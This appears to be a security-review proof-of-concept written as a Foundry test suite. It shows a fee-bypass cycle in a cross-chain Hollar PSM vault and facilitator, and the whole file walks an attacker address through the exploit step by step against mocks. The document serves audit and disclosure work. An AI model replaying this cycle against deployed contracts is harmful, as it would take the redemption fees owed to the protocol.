// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {HollarBaseVault} from "../../../src/psm/HollarBaseVault.sol";
import {HollarBaseFacilitator} from "../../../src/psm/HollarBaseFacilitator.sol";
import {IHollarBaseVault} from "../../../src/psm/interfaces/IHollarBaseVault.sol";
import {PsmPayload} from "../../../src/psm/lib/PsmPayload.sol";
import {RateLimiter} from "../../../src/psm/lib/RateLimiter.sol";
import {
    MockAToken,
    MockAaveOracle,
    MockAavePool,
    MockAddressesProvider,
    MockAggregator,
    MockCappedAdapter,
    MockGho,
    MockToken,
    MockWormholeCore,
    VaaBuilder
} from "../mocks/PsmMocks.sol";

/// @title Review PoC — redeem / cancel / remint-queue / cancelPendingMint fee-bypass cycle.
/// @notice Stands up both corridor contracts against mock wormhole cores and drives the exact
///         cycle from the review brief: redeem (fee assessed) → cancelQueuedRedemption (gross
///         re-mint) → remint queues on Hydration (rate limited) → cancelPendingMint (KIND_REFUND,
///         no fee) → Base credits the gross with no fee → user claims the full amount.
contract PsmFeeBypassCycleTest is Test, IHollarBaseVault {
    HollarBaseVault internal vault;
    HollarBaseFacilitator internal facilitator;

    MockToken internal usdc;
    MockAToken internal aUsdc;
    MockAavePool internal pool;
    MockAddressesProvider internal provider;
    MockGho internal hollar;
    MockWormholeCore internal wormholeBase; // on the "Base" side
    MockWormholeCore internal wormholeHydra; // on the "Hydration" side

    uint16 internal constant BASE_CHAIN = 30;
    uint16 internal constant HYDRATION_CHAIN = 73;

    address internal admin = makeAddr("admin");
    address internal guardian = makeAddr("guardian");
    address internal treasurer = makeAddr("treasurer");
    address internal attacker = makeAddr("attacker");

    uint256 internal constant SCALE = 1e12;
    uint256 internal constant ONE_USD = 1e8;
    uint256 internal constant MIN_PRICE = 99e6;

    function setUp() public {
        vm.warp(365 days);

        wormholeBase = new MockWormholeCore(BASE_CHAIN, 0);
        wormholeHydra = new MockWormholeCore(HYDRATION_CHAIN, 0);

        usdc = new MockToken("USDC", 6);
        aUsdc = new MockAToken();
        pool = new MockAavePool(usdc, aUsdc);
        MockAggregator aggregator = new MockAggregator(int256(ONE_USD));
        MockCappedAdapter cappedAdapter = new MockCappedAdapter(aggregator);
        provider = new MockAddressesProvider(
            address(pool), address(new MockAaveOracle(address(cappedAdapter), aggregator))
        );
        hollar = new MockGho();

        HollarBaseVault vaultImpl = new HollarBaseVault();
        vault = HollarBaseVault(
            address(
                new ERC1967Proxy(
                    address(vaultImpl),
                    abi.encodeCall(
                        HollarBaseVault.initializeVault,
                        (
                            VaultInit({
                                wormhole: address(wormholeBase),
                                usdc: address(usdc),
                                aUsdc: address(aUsdc),
                                addressesProvider: address(provider),
                                hydrationChainId: HYDRATION_CHAIN,
                                minUsdcPrice: MIN_PRICE,
                                admin: admin,
                                guardian: guardian,
                                treasurer: treasurer
                            })
                        )
                    )
                )
            )
        );

        HollarBaseFacilitator facImpl = new HollarBaseFacilitator();
        facilitator = HollarBaseFacilitator(
            address(
                new ERC1967Proxy(
                    address(facImpl),
                    abi.encodeCall(
                        HollarBaseFacilitator.initializeFacilitator,
                        (address(wormholeHydra), address(hollar), 6, BASE_CHAIN, admin, guardian)
                    )
                )
            )
        );

        hollar.addFacilitator(address(facilitator), 1_000_000e18);

        // Bind emitters (one-shot) at each other.
        vm.startPrank(admin);
        vault.setHydrationEmitter(PsmPayload.fromAddress(address(facilitator)));
        facilitator.setBaseEmitter(PsmPayload.fromAddress(address(vault)));
        vault.setDepositLimit(RateLimiter.UNLIMITED, 0);
        facilitator.setLimits(RateLimiter.UNLIMITED, RateLimiter.UNLIMITED, 0);
        vm.stopPrank();

        vm.startPrank(guardian);
        vault.setDepositsPaused(false);
        facilitator.setPaused(false, false);
        vm.stopPrank();

        // Fee is 5 bps (init default).
        usdc.mint(attacker, 1_000_000e6);
        vm.prank(attacker);
        usdc.approve(address(vault), type(uint256).max);
    }

    /// @dev Relay helper: take the payload the "Base" wormhole mock recorded and hand it to the
    ///      facilitator as a VAA from the vault emitter.
    function _relayBaseToHydra(uint256 salt) internal {
        bytes memory payload = wormholeBase.lastPublished().payload;
        facilitator.receiveMessage(
            VaaBuilder.buildSalted(BASE_CHAIN, PsmPayload.fromAddress(address(vault)), payload, salt)
        );
    }

    /// @dev Relay helper for the reverse direction.
    function _relayHydraToBase(uint256 salt) internal {
        bytes memory payload = wormholeHydra.lastPublished().payload;
        vault.receiveMessage(
            VaaBuilder.buildSalted(HYDRATION_CHAIN, PsmPayload.fromAddress(address(facilitator)), payload, salt)
        );
    }

    function test_feeBypassCycle_redeemCancelRemintQueueRefundPaysGross() public {
        uint256 amount = 100_000e6; // 100k USDC; 5 bps fee = 50 USDC

        // 1. Deposit on Base, minted to the attacker on Hydration.
        vm.prank(attacker);
        vault.deposit(amount, PsmPayload.fromAddress(attacker));
        _relayBaseToHydra(1);
        assertEq(hollar.balanceOf(attacker), amount * SCALE, "attacker holds minted HOLLAR");

        // 2. Redeem the whole position. Fee is assessed on Base when the credit books.
        vm.startPrank(attacker);
        hollar.approve(address(facilitator), type(uint256).max);
        facilitator.redeem(amount, attacker);
        vm.stopPrank();
        assertEq(hollar.balanceOf(attacker), 0, "HOLLAR burned");

        _relayHydraToBase(2);

        uint256 expectedFee = (amount * vault.redeemFeeBps()) / 10_000;
        assertEq(vault.principal(), 0, "principal consumed by the credit");
        assertEq(vault.owed(attacker), amount - expectedFee, "credit booked net of fee");

        // 3. Attacker is at the head; cancel the redemption. Gross is re-minted, fee undone.
        vm.prank(attacker);
        vault.cancelQueuedRedemption(0);
        assertEq(vault.principal(), amount, "gross restored to principal");
        assertEq(vault.owed(attacker), 0);

        // 4. The REMINT queues on Hydration: close the inbound window first, standing in for a
        //    remint that outruns a finite rate limit (covered separately below).
        vm.prank(admin);
        facilitator.setLimits(0, RateLimiter.UNLIMITED, 3600);
        _relayBaseToHydra(3);
        assertEq(hollar.balanceOf(attacker), 0, "nothing minted yet");
        assertEq(facilitator.pendingOf(attacker), amount, "remint queued");
        (bool found, uint256 id) = facilitator.pendingEntryOf(attacker);
        assertTrue(found);

        // 5. Cancel the pending mint: KIND_REFUND, no fee taken on Base.
        vm.prank(attacker);
        facilitator.cancelPendingMint(id);
        _relayHydraToBase(4);

        assertEq(vault.principal(), 0);
        assertEq(vault.owed(attacker), amount, "refund credited the GROSS - no fee");

        // 6. Claim the head: attacker receives the full gross.
        vm.prank(attacker);
        vault.claim();
        assertEq(usdc.balanceOf(attacker), 1_000_000e6, "attacker round-tripped with zero fee");

        // Contrast: had they simply claimed the original credit they would have kept
        // 1_000_000e6 - expectedFee. The cycle recovered the fee.
        assertGt(expectedFee, 0, "fee was nonzero, and it was bypassed");
    }

    /// @dev Same cycle, but with the inbound rate limit merely finite: a large remint queues on
    ///      RateLimited, showing the trigger exists under "normal" configured limits, not only
    ///      under a fully closed bucket.
    function test_feeBypassCycle_remintQueuesUnderFiniteInboundLimit() public {
        uint256 amount = 50_000e6;

        // Inbound window covers the initial mint but not the remint.
        vm.prank(admin);
        facilitator.setLimits(amount, RateLimiter.UNLIMITED, 24 hours);

        vm.prank(attacker);
        vault.deposit(amount, PsmPayload.fromAddress(attacker));
        _relayBaseToHydra(10); // consumes the full inbound budget
        assertEq(hollar.balanceOf(attacker), amount * SCALE);

        vm.startPrank(attacker);
        hollar.approve(address(facilitator), type(uint256).max);
        facilitator.redeem(amount, attacker);
        vm.stopPrank();
        _relayHydraToBase(11);

        uint256 expectedFee = (amount * vault.redeemFeeBps()) / 10_000;
        assertEq(vault.owed(attacker), amount - expectedFee);

        vm.prank(attacker);
        vault.cancelQueuedRedemption(0);
        _relayBaseToHydra(12);

        // Rate limited → queued, QueueReason.RateLimited (enum value 2).
        assertEq(facilitator.pendingOf(attacker), amount, "remint queued under a finite inbound limit");
        assertEq(hollar.balanceOf(attacker), 0);

        (bool found, uint256 id) = facilitator.pendingEntryOf(attacker);
        assertTrue(found);
        vm.prank(attacker);
        facilitator.cancelPendingMint(id);
        _relayHydraToBase(13);

        assertEq(vault.owed(attacker), amount, "fee bypassed via the same cycle");

        vm.prank(attacker);
        vault.claim();
        assertEq(usdc.balanceOf(attacker), 1_000_000e6);
    }
}
